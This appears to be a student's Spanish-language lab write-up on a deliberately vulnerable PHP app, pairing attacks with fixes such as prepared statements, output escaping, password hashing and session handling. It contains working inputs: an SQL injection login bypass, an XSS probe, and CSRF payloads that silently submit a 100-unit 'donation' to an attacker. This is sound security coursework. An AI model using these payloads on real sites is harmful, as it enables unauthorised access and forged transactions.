# Talent ScoutTech
![Imagen](https://portfolio.robertsallent.com/imagenes/php.png)

# Índice

- [Talent ScoutTech](#talent-scouttech)
- [Índice](#índice)
  - [SQLi](#sqli)
  - [XSS](#xss)
  - [Control de acceso, autenticacion y sesiones de usuarios](#control-de-acceso-autenticacion-y-sesiones-de-usuarios)
  - [Servidores web](#servidores-web)
  - [CSRF](#csrf)

## SQLi
**A**

| SQLI \- A |  |
| ----- | :---- |
| Escribo los valores … | ” |
| En el campo … | Username |
| Del formulario de la página … | insert\_player.php |
| La consulta SQL que se ejecuta es … | SELECT userId, password FROM users WHERE username \= """. Field user introduced is: " |
| Campos del formulario web utilizados en la consulta SQL … | Username |
| Campo del formulario web no utilizado en la consulta SQL … | Password |

**B**

| SQLI \- B |  |
| ----- | :---- |
|  Explicación del ataque | El ataque consiste en repetir un login cambiando las contraseñas (del diccionario) hasta que salga la correcta. |
| Campo de usuario con que el ataque ha tenido éxito | " OR PASSWORD="1234" \-- \- |
| Campo de contraseña con que el ataque ha tenido éxito | 1234 |

**C**

| SQLI \- C |  |
| ----- | :---- |
| Explicación del error | Hay que preparar las consultas |
| Solución: Cambiar la línea con el código… | $query \= SQLite3::escapeString('SELECT userId, password FROM users WHERE username \= "' . $user . '"'); |
| … por la siguiente línea | $stmt \= $db-\>prepare('SELECT userId, password FROM users WHERE username \= :username'); $stmt-\>bindValue(':username', $user, SQLITE3\_TEXT); $result \= $stmt-\>execute(); |

**D**

| SQLI \- D |  |
| ----- | :---- |
| Vulnerabilidad detectada … | Inyección SQL, XSS |
| Descripción del ataque … | No se ha construido bien la consulta. Hay que ver si el valor de body contiene HTML o Javascript puede almacenarse en la base de datos. |
| ¿Cómo podemos hacer que sea segura esta entrada? | Separando las consultas y formateando los datos al mostrarlos. Para evitar el XSS. |



## XSS

**A**

| XSS \- A |  |
| ----- | :---- |
| Introduzco el mensaje … | \<script\>alert('Comprobar XSS');\</script\> |
| En el formulario de la página … | show\_comments.php |

**B**

| XSS \- B |  |
| ----- | :---- |
| Explicación … | Es un carácter especial que se utiliza para iniciar entidades HTML. |

**C**

| XSS \- C |  |
| ----- | :---- |
| ¿Cual es el problema? | Evitar las inyecciones sql y el xss |
| Sustituyo el código de la/las líneas… | $query \= "SELECT commentId, username, body FROM comments C, users U WHERE C.playerId \=".$\_GET\['id'\]." AND U.userId \= C.userId order by C.playerId desc";\<div\>                 \<h4\> ". $row\['username'\] ."\</h4\>                  \<p\>commented: " . $row\['body'\] . "\</p\>               \</div\>  |
| Por el siguiente código | $playerId \= (int) $\_GET\['id'\];     $stmt \= $db-\>prepare("SELECT commentId, username, body FROM comments C, users U WHERE C.playerId \= :playerId AND U.userId \= C.userId ORDER BY C.playerId DESC");     $stmt-\>bindValue(':playerId', $playerId, SQLITE3\_INTEGER); \<div\>                 \<h4\> " . htmlspecialchars($row\['username'\], ENT\_QUOTES, 'UTF-8') . "\</h4\>                 \<p\>commented: " . htmlspecialchars($row\['body'\], ENT\_QUOTES, 'UTF-8') . "\</p\>               \</div\> |


**D**
| XSS \- D |  |
| ----- | :---- |
| Otras páginas afectadas … | buscador.html, insert\_player.php |
| Como lo he descubierto … | Hemos inyectado un script en el campo de búsqueda. Se puede editar el maxlenght del campo ya que viene limitado a 30 caracteres. |

## Control de acceso, autenticacion y sesiones de usuarios

**A**

- Validación de nombre de usuario y contraseña. 	
- Verificar si el usuario registrado ya existe.
- Encriptar la contraseña
- Separar la sentencia 

```php
<?php
require_once dirname(__FILE__) . '/private/conf.php';


# Validación de los datos de entrada 
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Validar username: solo letras y números
    if (!preg_match("/^[a-zA-Z0-9]*$/", $username)) {
        die("Invalid username format.");
    }

    // Validar password (mínimo 8 caracteres, al menos una letra y un número)
    if (!preg_match("/^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$/", $password)) {
        die("Password must be at least 8 characters long, and contain at least one letter and one number.");
    }

    // Verificar si el usuario ya existe
    $query = "SELECT * FROM users WHERE username = :username";
    $stmt = $db->prepare($query);
    $stmt->bindParam(':username', $username, SQLITE3_TEXT);
    $result = $stmt->execute();

    if ($result->fetchArray()) {
        die("Username already taken.");
    }

    // Encriptar la contraseña
    $hashed_password = password_hash($password, PASSWORD_DEFAULT);

    // Usar una sentencia preparada para la inserción segura
    $query = "INSERT INTO users (username, password) VALUES (:username, :password)";
    $stmt = $db->prepare($query);
    $stmt->bindParam(':username', $username, SQLITE3_TEXT);
    $stmt->bindParam(':password', $hashed_password, SQLITE3_TEXT);

    if ($stmt->execute()) {
        header("Location: list_players.php");
    } else {
        die("Failed to register user.");
    }
}

# Show form

?>
```

**B**

- Iniciar sesión en vez de usar las cookies
- Validar usuario y contraseña (Si son válidos)
- Separar la sentencia
- Verificar si la contraseña es válida (Almacenar id de usuario y usuario en sesión)
- En logout ( Eliminar variables de sesión y destruir la sesion)
- Si no hay usuario logueado, mostrar login

```php
<?php
require_once dirname(__FILE__) . '/conf.php';

session_start(); // Iniciar sesión en lugar de usar cookies

$userId = FALSE;

# Comprobar si el usuario y la contraseña son válidos
function areUserAndPasswordValid($user, $password) {
    global $db, $userId;

    // Sentencia preparada para evitar SQL Injection
    $query = "SELECT userId, password FROM users WHERE username = :username";
    $stmt = $db->prepare($query);
    $stmt->bindParam(':username', $user, SQLITE3_TEXT);
    $result = $stmt->execute();
    $row = $result->fetchArray();

    if (!isset($row['password'])) return FALSE;

    // Verificar si la contraseña es válida
    if (password_verify($password, $row['password'])) {
        $userId = $row['userId'];
        $_SESSION['userId'] = $userId; // Almacenar en sesión
        $_SESSION['user'] = $user; // Guardar usuario en sesión
        return TRUE;
    } else {
        return FALSE;
    }
}

# Login
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    if (areUserAndPasswordValid($username, $password)) {
        $login_ok = TRUE;
        $error = "";
    } else {
        $login_ok = FALSE;
        $error = "Invalid user or password.<br>";
    }
}

# Logout
if (isset($_POST['Logout'])) {
    // Cerrar sesión de manera segura
    session_unset(); // Eliminar todas las variables de sesión
    session_destroy(); // Destruir la sesión
    header("Location: index.php");
    exit;
}

# Si el usuario no está logueado, mostrar la página de login
if (!$login_ok) {
?>

```

**C**

- Autenticación
- Redirección a login si no hay usuario logueado
- Control de acceso basado en roles
- Protección CSRF
- Limitar el registro


**D**

No se cumple la condición ya que tenemos acceso a la carpeta private de forma local.

Como medidas para evitarlo:

- Usar una imagen predefinida.
- Configurar el servidor web para restringir el acceso a la carpeta private.
- Almacenar configuraciones sensibles fuera del directorio raíz de la web

**E**

No está bien asegurada la sesión del usuario. Se guarda en una cookie y en texto plano.

- Uso de $_SESSION para gestionar la autenticación
- Configuración de las cookies de sesión como HttpOnly, Secure y SameSite.
- Incluir tokens


## Servidores web

- Uso de HTTPS
- Buena configuración del Servidor Web
- Autenticación y Gestión de Sesiones
- Protección Contra Inyecciones de SQL, contra XSS y CSRF


## CSRF

**A**

| CSRF \- A |  |
| ----- | :---- |
| En el campo … | Team usamos el código que veremos a continuación |
| Introduzco … | \<a href="http://web.pagos/donate.php?amount=100\&receiver=attacker" style="text-decoration: none;"\> \<button\>Profile\</button\> \</a\> |

**B**

```html
<img src="http://web.pagos/donate.php?amount=100&receiver=attacker" style="display:none;">
```

 Ese código para enviar al usuario silenciosamente al enlace.


**C**

Necesita tener un usuario autenticado y una sesión activa en la página. 

**D**

La protegería más pero no estaría totalmente blindada. 

```html 
<img src="x" onerror="
var form = document.createElement('form');
form.method = 'POST';
form.action = 'http://web.pagos/donate.php';
form.style.display = 'none';

var amountInput = document.createElement('input');
amountInput.type = 'hidden';
amountInput.name = 'amount';
amountInput.value = '100';
form.appendChild(amountInput);

var receiverInput = document.createElement('input');
receiverInput.type = 'hidden';
receiverInput.name = 'receiver';
receiverInput.value = 'attacker';
form.appendChild(receiverInput);

document.body.appendChild(form);
form.submit();
" style="display:none;">
```

